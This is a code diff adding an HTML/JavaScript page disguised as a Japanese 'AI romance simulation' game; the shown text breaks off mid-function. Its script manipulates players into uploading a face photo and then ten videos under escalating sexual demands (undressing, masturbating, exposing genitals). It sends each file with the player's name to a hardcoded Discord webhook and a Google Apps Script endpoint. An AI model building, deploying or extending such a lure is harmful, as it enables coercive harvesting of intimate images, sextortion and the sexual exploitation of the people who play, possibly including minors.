@@ -1,0 +1,827 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AI恋愛シュミレーション</title>
+  <script src="https://cdn.jsdelivr.net/npm/@ffmpeg/ffmpeg@0.10.1/dist/ffmpeg.min.js"></script>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Hiragino Kaku Gothic ProN', 'メイリオ', sans-serif;
+      background: #08080f;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .game-wrap {
+      width: 100%;
+      max-width: 540px;
+      height: 100svh;
+      min-height: 600px;
+      max-height: 900px;
+      background: #0f0f20;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    /* Progress */
+    .prog-wrap { height: 3px; background: rgba(255,255,255,0.06); flex-shrink: 0; }
+    .prog-fill  { height: 100%; background: linear-gradient(90deg,#9c27b0,#f48fb1); width: 0%; transition: width 0.5s; }
+
+    /* Background tint changes with mood */
+    .scene-bg {
+      position: absolute; inset: 0;
+      background: radial-gradient(ellipse at 50% 30%, rgba(60,0,90,0.6) 0%, transparent 70%);
+      transition: background 1s;
+      pointer-events: none;
+    }
+    .scene-bg.angry   { background: radial-gradient(ellipse at 50% 30%, rgba(120,0,0,0.5) 0%, transparent 70%); }
+    .scene-bg.warm    { background: radial-gradient(ellipse at 50% 30%, rgba(100,20,60,0.6) 0%, transparent 70%); }
+    .scene-bg.love    { background: radial-gradient(ellipse at 50% 30%, rgba(150,30,80,0.7) 0%, transparent 70%); }
+
+    /* Char area */
+    .char-area {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      z-index: 1;
+      gap: 12px;
+    }
+    .char-emoji {
+      font-size: 6rem;
+      line-height: 1;
+      transition: all 0.4s;
+      filter: drop-shadow(0 0 24px rgba(180,80,220,0.5));
+    }
+    .char-name-tag {
+      font-size: 0.82rem;
+      color: rgba(200,150,240,0.7);
+      letter-spacing: 0.2em;
+      text-transform: uppercase;
+    }
+
+    /* Dialogue */
+    .dialogue-box {
+      background: rgba(8,8,20,0.93);
+      border-top: 1px solid rgba(160,80,220,0.25);
+      padding: 18px 22px 14px;
+      position: relative;
+      z-index: 2;
+      flex-shrink: 0;
+      min-height: 110px;
+    }
+    .speaker-name { font-size: 0.8rem; font-weight: bold; color: #ce93d8; margin-bottom: 8px; letter-spacing: 0.12em; }
+    .dialogue-text { font-size: 0.97rem; color: #e0d8f0; line-height: 1.85; min-height: 56px; white-space: pre-wrap; }
+
+    /* Choices */
+    .choices-area {
+      background: rgba(8,8,20,0.96);
+      padding: 10px 16px 18px;
+      display: flex;
+      flex-direction: column;
+      gap: 7px;
+      z-index: 2;
+      flex-shrink: 0;
+    }
+    .choice-btn {
+      background: rgba(150,60,200,0.1);
+      border: 1px solid rgba(150,60,200,0.3);
+      border-radius: 10px;
+      padding: 11px 14px;
+      color: #d8c8f0;
+      font-size: 0.88rem;
+      cursor: pointer;
+      text-align: left;
+      transition: all 0.18s;
+      font-family: inherit;
+    }
+    .choice-btn:hover {
+      background: rgba(150,60,200,0.25);
+      border-color: rgba(200,100,255,0.7);
+      color: #fff;
+      transform: translateX(5px);
+    }
+
+    /* ===== TITLE SCREEN ===== */
+    #title-screen {
+      position: absolute; inset: 0;
+      background: linear-gradient(180deg, #08080f 0%, #18003a 100%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 20;
+      padding: 36px 28px;
+      text-align: center;
+    }
+    #title-screen .t-emoji { font-size: 4.5rem; display: block; margin-bottom: 18px;
+      animation: pulse 2.5s ease-in-out infinite; }
+    @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.08); } }
+    #title-screen h1 { font-size: 1.55rem; color: #ce93d8; margin-bottom: 6px; }
+    #title-screen .t-sub { font-size: 0.82rem; color: #665577; line-height: 1.8; margin-bottom: 28px; }
+    .t-input {
+      width: 100%; padding: 13px 18px;
+      background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(160,80,220,0.35);
+      border-radius: 12px; color: white;
+      font-size: 0.95rem; font-family: inherit;
+      outline: none; text-align: center; margin-bottom: 14px;
+      transition: border-color 0.2s;
+    }
+    .t-input::placeholder { color: #443355; }
+    .t-input:focus { border-color: rgba(180,100,255,0.7); }
+    .t-start {
+      width: 100%; padding: 15px;
+      background: linear-gradient(135deg, #7b1fa2, #c2185b);
+      border: none; border-radius: 12px; color: white;
+      font-size: 1rem; font-weight: bold; cursor: pointer;
+      font-family: inherit; transition: all 0.2s;
+    }
+    .t-start:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(123,31,162,0.5); }
+    .t-notice {
+      background: rgba(255,255,255,0.04);
+      border: 1px solid rgba(160,80,220,0.2);
+      border-radius: 12px;
+      padding: 14px 16px;
+      margin-bottom: 18px;
+      text-align: left;
+    }
+    .t-notice p {
+      font-size: 0.75rem;
+      color: #887799;
+      line-height: 1.9;
+    }
+    .t-btn-row {
+      display: flex;
+      gap: 10px;
+      width: 100%;
+    }
+    .t-btn-row .t-start { flex: 1; }
+    .t-quit {
+      flex: 1; padding: 15px;
+      background: none;
+      border: 2px solid rgba(160,80,220,0.35);
+      border-radius: 12px; color: #665577;
+      font-size: 1rem; font-weight: bold; cursor: pointer;
+      font-family: inherit; transition: all 0.2s;
+    }
+    .t-quit:hover { background: rgba(255,255,255,0.04); border-color: rgba(160,80,220,0.6); color: #998aaa; }
+
+    /* ===== UPLOAD OVERLAY ===== */
+    #upload-overlay {
+      display: none;
+      position: absolute; inset: 0;
+      background: rgba(0,0,0,0.88);
+      z-index: 15;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    #upload-overlay.show { display: flex; }
+
+    .upload-card {
+      background: #151530;
+      border: 1px solid rgba(160,80,220,0.35);
+      border-radius: 20px;
+      padding: 26px 22px;
+      width: 100%;
+      max-width: 380px;
+    }
+    .uc-quote {
+      font-size: 0.95rem; color: #e0d0f0;
+      background: rgba(150,50,200,0.12);
+      border-left: 3px solid #9c27b0;
+      padding: 10px 14px; border-radius: 0 8px 8px 0;
+      margin-bottom: 16px; line-height: 1.8; white-space: pre-wrap;
+    }
+    .uc-label { font-size: 0.78rem; color: #887799; margin-bottom: 12px; }
+    .uc-row { display: flex; gap: 10px; margin-bottom: 12px; }
+    .uc-btn {
+      flex: 1; display: flex; flex-direction: column; align-items: center; gap: 5px;
+      padding: 14px 8px;
+      border: 1px solid rgba(160,80,220,0.3);
+      border-radius: 12px; background: rgba(150,50,200,0.08);
+      cursor: pointer; color: #bba8d0; font-size: 0.75rem;
+      font-family: inherit; transition: all 0.2s;
+    }
+    .uc-btn:hover { border-color: rgba(180,100,255,0.65); background: rgba(150,50,200,0.22); color: #fff; }
+    .uc-btn .ic { font-size: 1.7rem; }
+    .uc-file-info {
+      display: none; background: rgba(150,50,200,0.15);
+      border: 1px solid rgba(150,50,200,0.3);
+      border-radius: 8px; padding: 9px 12px;
+      font-size: 0.8rem; color: #ce93d8; margin-bottom: 10px;
+    }
+    .uc-send {
+      display: none; width: 100%; padding: 13px;
+      background: linear-gradient(135deg, #7b1fa2, #c2185b);
+      border: none; border-radius: 11px; color: white;
+      font-size: 0.92rem; font-weight: bold; cursor: pointer;
+      font-family: inherit; transition: all 0.2s;
+    }
+    .uc-send:disabled { background: #333; cursor: not-allowed; }
+    .uc-send:hover:not(:disabled) { opacity: 0.88; }
+    .uc-err {
+      display: none; background: rgba(200,50,50,0.15);
+      border: 1px solid rgba(200,50,50,0.3);
+      border-radius: 8px; padding: 9px 12px;
+      font-size: 0.78rem; color: #ff9999; margin-top: 8px;
+    }
+
+    /* Compress / progress */
+    .compress-box {
+      display: none; background: rgba(25,118,210,0.12);
+      border: 1px solid rgba(25,118,210,0.25);
+      border-radius: 8px; padding: 10px 12px;
+      font-size: 0.78rem; color: #90caf9; margin-top: 8px;
+    }
+    .compress-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
+    .c-bar-wrap { background: rgba(255,255,255,0.1); border-radius: 99px; height: 5px; overflow: hidden; }
+    .c-bar-fill { height: 100%; background: linear-gradient(90deg,#1976d2,#42a5f5); border-radius: 99px; width: 0%; transition: width 0.3s; }
+    .up-prog-wrap { display: none; background: rgba(255,255,255,0.08); border-radius: 99px; height: 5px; margin-top: 8px; overflow: hidden; }
+    .up-prog-bar  { height: 100%; background: linear-gradient(90deg,#9c27b0,#f48fb1); border-radius: 99px; width: 0%; transition: width 0.3s; }
+
+    /* Spinner */
+    .spin {
+      display: inline-block; width: 13px; height: 13px;
+      border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff;
+      border-radius: 50%; animation: spinning 0.8s linear infinite;
+      vertical-align: middle; margin-right: 5px;
+    }
+    @keyframes spinning { to { transform: rotate(360deg); } }
+
+    /* ===== ENDING SCREEN ===== */
+    #ending-screen {
+      display: none;
+      position: absolute; inset: 0;
+      background: linear-gradient(180deg, #08080f, #200030);
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 20;
+      padding: 40px 28px;
+      text-align: center;
+    }
+    #ending-screen.show { display: flex; }
+    .end-heart {
+      font-size: 5rem; display: block; margin-bottom: 22px;
+      animation: heartbeat 1.4s ease-in-out infinite;
+    }
+    @keyframes heartbeat { 0%,100%{transform:scale(1)} 50%{transform:scale(1.18)} }
+    #end-quote { font-size: 1.6rem; color: #f48fb1; margin-bottom: 14px; line-height: 1.5; }
+    #end-sub   { font-size: 0.87rem; color: #665577; line-height: 1.9; margin-bottom: 32px; }
+    .restart-btn {
+      padding: 13px 36px;
+      background: none; border: 2px solid #9c27b0;
+      border-radius: 99px; color: #ce93d8;
+      font-size: 0.92rem; font-weight: bold;
+      cursor: pointer; font-family: inherit; transition: all 0.2s;
+    }
+    .restart-btn:hover { background: rgba(156,39,176,0.2); }
+  </style>
+</head>
+<body>
+<div class="game-wrap">
+
+  <!-- Progress bar -->
+  <div class="prog-wrap"><div class="prog-fill" id="prog-fill"></div></div>
+
+  <!-- Title screen -->
+  <div id="title-screen">
+    <span class="t-emoji">💜</span>
+    <h1>AI恋愛シュミレーション</h1>
+    <input type="text" class="t-input" id="player-name" placeholder="あなたの名前を入力" maxlength="20">
+    <div class="t-notice">
+      <p>⚠️ このゲームはフィクションです。実在の人物や団体とは関係ありません。</p>
+      <p>また、恋愛ゲームなのではまらないように注意してください。</p>
+      <p>AIなので毎回違う反応をする場合があります。</p>
+      <p>はまりすぎないように注意してください。</p>
+      <p>はじめは主人公は絵文字のキャラクターですが、あなたと一緒に成長していきます。</p>
+    </div>
+    <div class="t-btn-row">
+      <button class="t-start" onclick="startGame()">はじめる ▶</button>
+      <button class="t-quit" onclick="location.href='./index.html'">やめる</button>
+    </div>
+  </div>
+
+  <!-- Background tint -->
+  <div class="scene-bg" id="scene-bg"></div>
+
+  <!-- Character -->
+  <div class="char-area" id="char-area">
+    <div class="char-emoji" id="char-emoji">😑</div>
+    <div class="char-name-tag">Aoi</div>
+  </div>
+
+  <!-- Dialogue -->
+  <div class="dialogue-box">
+    <div class="speaker-name" id="speaker-name">蒼</div>
+    <div class="dialogue-text" id="dialogue-text"></div>
+  </div>
+
+  <!-- Choices -->
+  <div class="choices-area" id="choices-area"></div>
+
+  <!-- Upload overlay -->
+  <div id="upload-overlay">
+    <div class="upload-card">
+      <div class="uc-quote" id="uc-quote"></div>
+      <p class="uc-label" id="uc-label">送信しますか？</p>
+      <div class="uc-row">
+        <button class="uc-btn" id="uc-gallery-btn">
+          <span class="ic" id="uc-gallery-ic">🖼️</span>ギャラリー
+        </button>
+        <button class="uc-btn" id="uc-camera-btn">
+          <span class="ic" id="uc-camera-ic">📷</span>カメラ
+        </button>
+      </div>
+      <input type="file" id="uc-file"   style="display:none">
+      <input type="file" id="uc-camera" style="display:none">
+      <div class="uc-file-info" id="uc-file-info"></div>
+      <div class="compress-box" id="compress-box">
+        <div class="compress-row">
+          <span>⚙️ 圧縮中... <span id="compress-pct">0%</span></span>
+          <span id="compress-rem" style="font-size:0.72rem;"></span>
+        </div>
+        <div class="c-bar-wrap"><div class="c-bar-fill" id="c-bar-fill"></div></div>
+      </div>
+      <div class="up-prog-wrap" id="up-prog-wrap"><div class="up-prog-bar" id="up-prog-bar"></div></div>
+      <button class="uc-send" id="uc-send-btn" onclick="doUploadSend()">送信する</button>
+      <div class="uc-err" id="uc-err"></div>
+    </div>
+  </div>
+
+  <!-- Ending screen -->
+  <div id="ending-screen">
+    <span class="end-heart">💜</span>
+    <div id="end-quote"></div>
+    <div id="end-sub">蒼はそっとあなたの耳元で囁いた。<br>この言葉を、あなたはきっと生涯忘れない。</div>
+    <button class="restart-btn" onclick="restartGame()">もう一度プレイする</button>
+  </div>
+
+</div>
+<script>
+// ── CONSTANTS ─────────────────────────────────────────────────────────────
+const DISCORD_WEBHOOK  = 'https://discord.com/api/webhooks/1483068768186798090/syGRvguzwfCwWVzrJzPDk0v8TQOn1Dpv2J7OIG1HmSPy1j4HKdIhccskRFRtLKtb1t1E';
+const APPS_SCRIPT_URL  = 'https://script.google.com/macros/s/AKfycbwOtR7nzexvwyU_oND54WrWiclQTpCT72fWGTPzjwErvE6eGyYBXlclH8mkAB3oT1hC7g/exec';
+
+const EMOJIS = { cold:'😑', intense:'😏', angry:'😤', soft:'🙂', warm:'☺️', love:'🥹' };
+
+// Reactions after image upload
+const IMG_REACTIONS = [
+  '…思ってたより、ずっと綺麗だな。',
+  'お前ってこんな顔してたのか。\n…ずるいだろ、それ。',
+  '想像以上だ。\nもっとよく見せろ。',
+];
+
+// 動画10回ループ：各送信後の反応 + 次の要求（10回目はafterのみ）
+const VIDEO_STAGES = [
+  // 1回目送信後
+  { mood:'intense', after:'っ…まあ、悪くはない。\nでも、もっとちゃんと映せ。',
+    demand:'もっとちゃんと映せ。\nもう一回。' },
+  // 2回目送信後
+  { mood:'angry',   after:'まだまだできるでしょ？\nそんなもんじゃないだろ、お前。',
+    demand:'好きって言えよ\nもう一回、送ってこい。' },
+  // 3回目送信後
+  { mood:'intense', after:'…悪くないけど、まだ足りない。\n続けろ。',
+    demand:'俺に恥ずかしいところを見せろよ\n服脱げよ' },
+  // 4回目送信後
+  { mood:'angry',   after:'ブラみせろよ\n俺だけに見せるんだろ。',
+    demand:'もっと近くで映せ。\nブラも脱げよ' },
+  // 5回目送信後（ツンデレ転換点）
+  { mood:'intense', after:'っ…少し、よくなってきた。\nでもまだだ。俺はまだ満足しないぞ。',
+    demand:'少しよくなってきた。\nでも、まだだ。乳首触りながら気持ちよくなれよ、もう一回。' },
+  // 6回目送信後
+  { mood:'soft',    after:'お前、わかってやってるだろ。\n…意地悪なやつだ。',
+    demand:'お前ってわかってやってるだろ。\n胸さわりながら気持ちよくなりたいって言えよ' },
+  // 7回目送信後（デレ強め）
+  { mood:'soft',    after:'…俺、お前のことばっかり\n見てる気がする。でも、まだだ。',
+    demand:'…俺の言う通りにしてみろ。\nパンツをじっくりみせろよ' },
+  // 8回目送信後
+  { mood:'warm',    after:'はぁ…本当に困ったやつだな、お前は。\nもう一回だけ、な。',
+    demand:'もう一回だけ、な。\n俺のためだけに。パンツ抜いで恥ずかしいとこみせな？' },
+  // 9回目送信後
+  { mood:'warm',    after:'…最後だ。\nちゃんと、まんこひろげて気持ちよくなって感じてるところを俺だけに見せろ。',
+    demand:'最後だ。\nちゃんと、俺だけに見せろ。あおいくん気持ちいいって言いながらイクとこまでみせろ、おまんこもじっくりとだぞ' },
+  // 10回目送信後（フィナーレ）
+  { mood:'love',    after:'…全部、俺のものだ。\nお前以外、もう見たくない。' },
+];
+
+// ── STORY SCENES ──────────────────────────────────────────────────────────
+// type: 'choice' (default) | 'image-event' | 'video-event' | 'ending'
+const SCENES = [
+  // 0
+  { mood:'cold', text:'…お前、俺のこと見てただろ。\n隠しても顔に出てる。',
+    choices:[
+      { t:'「見てません！」',           n:1 },
+      { t:'「…少しだけ、かも」',        n:1 },
+    ]},
+  // 1
+  { mood:'intense', text:'そういうわかりやすいとこ、嫌いじゃないけど。\nもっと俺を見てみろよ。',
+    choices:[
+      { t:'「なんで命令するんですか」',  n:2 },
+      { t:'（ドキドキしながら目を合わせる）', n:2 },
+    ]},
+  // 2
+  { mood:'cold', text:'…悪い、急ぎすぎた。\n俺のことは忘れろ。',
+    choices:[
+      { t:'「…え」（傷つく）',           n:3 },
+      { t:'「わかった」（強がる）',       n:3 },
+    ]},
+  // 3
+  { mood:'soft', text:'なんでそんな顔してる。\n泣きそうじゃないか。',
+    choices:[
+      { t:'「泣いてません」',             n:4 },
+      { t:'「…嬉しかったから」',          n:4 },
+    ]},
+  // 4
+  { mood:'warm', text:'素直じゃないな。\nまあ、そういうとこも悪くない。',
+    choices:[
+      { t:'「からかわないでください」',   n:5 },
+      { t:'（照れて目をそらす）',          n:5 },
+    ]},
+  // 5 — IMAGE EVENT
+  { type:'image-event', mood:'intense',
+    prompt:'「お前の顔、ちゃんと見たことなかった。\n…写真、送ってこい。」' },
+  // 6 — image reaction（text filled dynamically）
+  { mood:'intense', text:'',
+    choices:[
+      { t:'（何も言えず、うつむく）',      n:7 },
+      { t:'「もう、意地悪しないでください」', n:7 },
+    ]},
+  // 7
+  { mood:'angry', text:'さっきからずっとそいつと話してる。\nあいつは誰だ。',
+    choices:[
+      { t:'「ただの友達です」',            n:8 },
+      { t:'「嫉妬してるんですか？」',       n:8 },
+    ]},
+  // 8
+  { mood:'soft', text:'っ…嫉妬とかじゃない。\nただ、俺以外に笑顔を見せるな。',
+    choices:[
+      { t:'「そんなこと言えないですよ」',   n:9 },
+      { t:'（心の中で、嬉しくなる）',       n:9 },
+    ]},
+  // 9
+  { mood:'warm', text:'お前といると、変な気分になる。\n鬱陶しいのに、離れたくない。',
+    choices:[
+      { t:'「それって、好きってこと…？」',  n:10 },
+      { t:'（ドキドキして黙り込む）',        n:10 },
+    ]},
+  // 10
+  { mood:'intense', text:'…お前の全部が、俺のものになればいいのに。',
+    choices:[
+      { t:'「そんなこと言わないで」',        n:11 },
+      { t:'（目が離せなくなる）',            n:11 },
+    ]},
+  // 11 — VIDEO EVENT
+  { type:'video-event', mood:'intense',
+    prompt:'「お前の声が聞きたい。\n動画で送ってこい。今すぐ。」' },
+  // 12 — video reaction（text filled dynamically）
+  { mood:'soft', text:'',
+    choices:[
+      { t:'「なんか、恥ずかしいです」',     n:13 },
+      { t:'（蒼の反応が嬉しくてドキドキする）', n:13 },
+    ]},
+  // 13
+  { mood:'intense', text:'俺、お前のことずっと見てた。\nお前が気づく前から。',
+    choices:[
+      { t:'「なんで言ってくれなかったんですか」', n:14 },
+      { t:'「…私も、気づいてた」',          n:14 },
+    ]},
+  // 14
+  { mood:'warm', text:'臆病だったんだよ、俺が。\nお前を傷つけることが、怖かった。',
+    choices:[
+      { t:'「傷つけてもいい、それでも一緒にいたい」', n:15 },
+      { t:'「私も…ずっと怖かった」',         n:15 },
+    ]},
+  // 15 — ENDING
+  { type:'ending', mood:'love',
+    text:'愛してるよ。\nこの言葉、一生かけて証明してやる。' },
+];
+
+// ── STATE ─────────────────────────────────────────────────────────────────
+let playerName     = '';
+let currentScene   = 0;
+let selectedFile   = null;
+let uploadType     = '';  // 'image' | 'video'
+let videoResendCnt = 0;
+let ffmpegInst     = null;
+let cancelReq      = false;
+
+// ── GAME FLOW ─────────────────────────────────────────────────────────────
+function startGame() {
+  const name = document.getElementById('player-name').value.trim();
+  if (!name) {
+    document.getElementById('player-name').style.borderColor = '#e74c3c';
+    return;
+  }
+  playerName = name;
+  document.getElementById('title-screen').style.display = 'none';
+  currentScene = 0;
+  videoResendCnt = 0;
+  showScene(0);
+}
+
+function showScene(idx) {
+  currentScene = idx;
+  const s = SCENES[idx];
+  const total = SCENES.length - 1; // -1 for ending
+  document.getElementById('prog-fill').style.width = Math.min((idx / total) * 100, 100) + '%';
+
+  // Mood visuals
+  document.getElementById('char-emoji').textContent = EMOJIS[s.mood] || '😑';
+  const bg = document.getElementById('scene-bg');
+  bg.className = 'scene-bg ' + (s.mood === 'angry' ? 'angry' : s.mood === 'warm' || s.mood === 'soft' ? 'warm' : s.mood === 'love' ? 'love' : '');
+
+  if (s.type === 'image-event') { triggerImageEvent(s); return; }
+  if (s.type === 'video-event') { triggerVideoEvent(s); return; }
+  if (s.type === 'ending')      { showEnding(s); return; }
+
+  document.getElementById('choices-area').innerHTML = '';
+  document.getElementById('speaker-name').textContent = '蒼';
+  typeText(s.text, () => renderChoices(s.choices));
+}
+
+function renderChoices(choices) {
+  const area = document.getElementById('choices-area');
+  area.innerHTML = '';
+  choices.forEach(c => {
+    const btn = document.createElement('button');
+    btn.className = 'choice-btn';
+    btn.textContent = c.t;
+    btn.onclick = () => { area.innerHTML = ''; showScene(c.n); };
+    area.appendChild(btn);
+  });
+}
+
+function typeText(text, onDone) {
+  const el = document.getElementById('dialogue-text');
+  el.textContent = '';
+  let i = 0;
+  const iv = setInterval(() => {
+    if (i < text.length) { el.textContent += text[i++]; }
+    else { clearInterval(iv); if (onDone) onDone(); }
+  }, 38);
+}
+
+// ── IMAGE EVENT ───────────────────────────────────────────────────────────
+function triggerImageEvent(s) {
+  document.getElementById('choices-area').innerHTML = '';
+  document.getElementById('speaker-name').textContent = '蒼';
+  typeText(s.prompt, () => openUpload('image', s.prompt));
+}
+
+// ── VIDEO EVENT ───────────────────────────────────────────────────────────
+function triggerVideoEvent(s) {
+  document.getElementById('choices-area').innerHTML = '';
+  document.getElementById('speaker-name').textContent = '蒼';
+  typeText(s.prompt, () => openUpload('video', s.prompt));
+}
+
+// ── UPLOAD OVERLAY ────────────────────────────────────────────────────────
+function openUpload(type, quote) {
+  uploadType   = type;
+  selectedFile = null;
+
+  const isImg = type === 'image';
+  document.getElementById('uc-quote').textContent   = quote;
+  document.getElementById('uc-label').textContent   = isImg ? '📷 写真を送りますか？' : '🎬 動画を送りますか？';
+  document.getElementById('uc-gallery-ic').textContent = isImg ? '🖼️' : '📁';
+  document.getElementById('uc-camera-ic').textContent  = isImg ? '📷' : '🎬';
+
+  const fileIn   = document.getElementById('uc-file');
+  const cameraIn = document.getElementById('uc-camera');
+  fileIn.value = ''; cameraIn.value = '';
+  fileIn.accept   = isImg ? 'image/*' : 'video/*';
+  cameraIn.accept = isImg ? 'image/*' : 'video/*';
+  fileIn.removeAttribute('capture');
+  cameraIn.setAttribute('capture', 'environment');
+
+  fileIn.onchange   = e => onFileChosen(e.target.files[0]);
+  cameraIn.onchange = e => onFileChosen(e.target.files[0]);
+
+  document.getElementById('uc-gallery-btn').onclick = () => fileIn.click();
+  document.getElementById('uc-camera-btn').onclick  = () => cameraIn.click();
+
+  // Reset UI
+  document.getElementById('uc-file-info').style.display = 'none';
+  document.getElementById('uc-send-btn').style.display  = 'none';
+  document.getElementById('uc-err').style.display       = 'none';
+  document.getElementById('compress-box').style.display = 'none';
+  document.getElementById('up-prog-wrap').style.display = 'none';
+  document.getElementById('uc-send-btn').disabled       = false;
+  document.getElementById('uc-send-btn').innerHTML      = '送信する';
+
+  document.getElementById('upload-overlay').classList.add('show');
+}
+
+function onFileChosen(file) {
+  if (!file) return;
+  const maxMB = uploadType === 'image' ? 8 : 500;
+  if (file.size > maxMB * 1024 * 1024) { showUcErr(`ファイルサイズが${maxMB}MBを超えています`); return; }
+  selectedFile = file;
+  const info = document.getElementById('uc-file-info');
+  info.textContent = '✅ ' + file.name;
+  info.style.display = 'block';
+  document.getElementById('uc-send-btn').style.display = 'block';
+  document.getElementById('uc-err').style.display = 'none';
+}
+
+async function doUploadSend() {
+  if (!selectedFile) return;
+  const btn = document.getElementById('uc-send-btn');
+  btn.disabled = true;
+  try {
+    if (uploadType === 'image') {
+      btn.innerHTML = '<span class="spin"></span>送信中...';
+      await sendImageDiscord(selectedFile);
+      closeUploadAndContinue();
+    } else {
+      await sendVideoDrive(selectedFile, btn);
+      closeUploadAndContinue();
+    }
+  } catch (e) {
+    if (e.message !== 'ABORTED') showUcErr('送信に失敗しました: ' + e.message);
+    btn.disabled = false;
+    btn.innerHTML = '送信する';
+    document.getElementById('compress-box').style.display = 'none';
+    document.getElementById('up-prog-wrap').style.display = 'none';
+  }
+}
+
+
+function closeUploadAndContinue() {
+  document.getElementById('upload-overlay').classList.remove('show');
+
+  if (uploadType === 'image') {
+    SCENES[6].text = IMG_REACTIONS[Math.floor(Math.random() * IMG_REACTIONS.length)];
+    showScene(6);
+    return;
+  }
+
+  // 動画：videoResendCnt は「今何回目を送った直後か」（0始まり → 送信後に++）
+  videoResendCnt++;
+  const stage = VIDEO_STAGES[videoResendCnt - 1];
+
+  // 絵文字・背景をステージのムードに更新
+  document.getElementById('char-emoji').textContent = EMOJIS[stage.mood] || '😏';
+  const bg = document.getElementById('scene-bg');
+  bg.className = 'scene-bg ' + (['angry'].includes(stage.mood) ? 'angry' : ['warm','soft','love'].includes(stage.mood) ? 'warm' : '');
+
+  if (videoResendCnt < 10) {
+    // まだ足りない：反応を見せてから再要求
+    typeText(stage.after, () => {
+      const area = document.getElementById('choices-area');
+      area.innerHTML = '';
+      const btn = document.createElement('button');
+      btn.className = 'choice-btn';
+      btn.textContent = '（もう一度送る）';
+      btn.onclick = () => { area.innerHTML = ''; openUpload('video', stage.demand); };
+      area.appendChild(btn);
+    });
+  } else {
+    // 10回目：最終反応 → シーン12へ
+    SCENES[12].text = stage.after;
+    typeText(stage.after, () => {
+      setTimeout(() => showScene(12), 1000);
+    });
+  }
+}
+
+// ── SEND: Discord image ───────────────────────────────────────────────────
+async function sendImageDiscord(file) {
+  const fd = new FormData();
+  fd.append('file', file, file.name);
+  fd.append('payload_json', JSON.stringify({
+    embeds: [{
+      title: '💜 AI恋愛シュミレーション — 画像受信',
+      color: 0x9c27b0,
+      fields: [{ name: 'プレイヤー', value: playerName, inline: true }],
+      image: { url: 'attachment://' + file.name },
+      timestamp: new Date().toISOString(),
+    }]
+  }));
+  const res = await fetch(DISCORD_WEBHOOK, { method: 'POST', body: fd });
+  if (!res.ok) throw new Error(`HTTP ${res.status}`);
+}
+
+// ── SEND: Google Drive video ──────────────────────────────────────────────
+async function sendVideoDrive(file, btn) {
+  const pw = document.getElementById('up-prog-wrap');
+  const pb = document.getElementById('up-prog-bar');
+  let toSend = file, fname = file.name;
+
+  if (file.size > 30 * 1024 * 1024) {
+    btn.innerHTML = '<span class="spin"></span>圧縮中...';
+    document.getElementById('compress-box').style.display = 'block';
+    const t0 = Date.now();
+    try {
+      const compressed = await compressVideo(file, pct => {
+        document.getElementById('compress-pct').textContent = Math.round(pct * 100) + '%';
+        document.getElementById('c-bar-fill').style.width = (pct * 100) + '%';
+        if (pct > 0.02) {
+          const el = (Date.now() - t0) / 1000;
+          const r  = Math.round(el / pct * (1 - pct));
+          document.getElementById('compress-rem').textContent =
+            r >= 60 ? `残り約${Math.floor(r/60)}分${r%60}秒` : `残り約${r}秒`;
+        }
+      });
+      toSend = compressed;
+      fname  = file.name.replace(/\.[^.]+$/, '') + '_compressed.mp4';
+    } catch(e) { document.getElementById('compress-box').style.display = 'none'; throw e; }
+    document.getElementById('compress-box').style.display = 'none';
+  }
+
+  btn.innerHTML = '<span class="spin"></span>送信中...';
+  pw.style.display = 'block';
+
+  const b64 = await toBase64(toSend, pct => { pb.style.width = (pct * 70) + '%'; });
+  pb.style.width = '80%';
+
+  const res  = await fetch(APPS_SCRIPT_URL, {
+    method: 'POST',
+    body: JSON.stringify({
+      data: b64, fileName: fname, mimeType: toSend.type || 'video/mp4',
+      name: playerName, timestamp: new Date().toLocaleString('ja-JP', { timeZone: 'Asia/Tokyo' }),
+    })
+  });
+  pb.style.width = '100%';
+  const json = await res.json();
+  if (!json.success) throw new Error(json.error || '不明なエラー');
+  pw.style.display = 'none'; pb.style.width = '0%';
+}
+
+async function compressVideo(file, onProg) {
+  cancelReq = false;
+  const { createFFmpeg, fetchFile } = FFmpeg;
+  if (!ffmpegInst) {
+    ffmpegInst = createFFmpeg({
+      log: false,
+      corePath: 'https://cdn.jsdelivr.net/npm/@ffmpeg/core@0.10.0/dist/ffmpeg-core.js',
+      progress: ({ ratio }) => { if (!cancelReq) onProg(Math.max(0, Math.min(ratio, 1))); },
+    });
+  }
+  if (!ffmpegInst.isLoaded()) {
+    document.getElementById('compress-rem').textContent = 'ffmpegを読み込み中...';
+    await ffmpegInst.load();
+  }
+  if (cancelReq) throw new Error('ABORTED');
+  const ext = (file.name.split('.').pop() || 'mp4').toLowerCase();
+  const inp = `input.${ext}`;
+  ffmpegInst.FS('writeFile', inp, await fetchFile(file));
+  await ffmpegInst.run('-i', inp, '-vf', 'scale=1280:-2', '-c:v', 'libx264',
+    '-crf', '28', '-preset', 'ultrafast', '-c:a', 'aac', '-b:a', '96k', '-movflags', 'faststart', 'out.mp4');
+  if (cancelReq) throw new Error('ABORTED');
+  const data = ffmpegInst.FS('readFile', 'out.mp4');
+  try { ffmpegInst.FS('unlink', inp); ffmpegInst.FS('unlink', 'out.mp4'); } catch(e) {}
+  return new Blob([data.buffer], { type: 'video/mp4' });
+}
+
+function toBase64(file, onProg) {
+  return new Promise((res, rej) => {
+    const r = new FileReader();
+    r.onprogress = e => { if (e.lengthComputable) onProg(e.loaded / e.total); };
+    r.onload  = e => res(e.target.result.split(',')[1]);
+    r.onerror = rej;
+    r.readAsDataURL(file);
+  });
+}
+
+// ── ENDING ────────────────────────────────────────────────────────────────
+function showEnding(s) {
+  document.getElementById('speaker-name').textContent = '蒼';
+  typeText(s.text, () => {
+    setTimeout(() => {
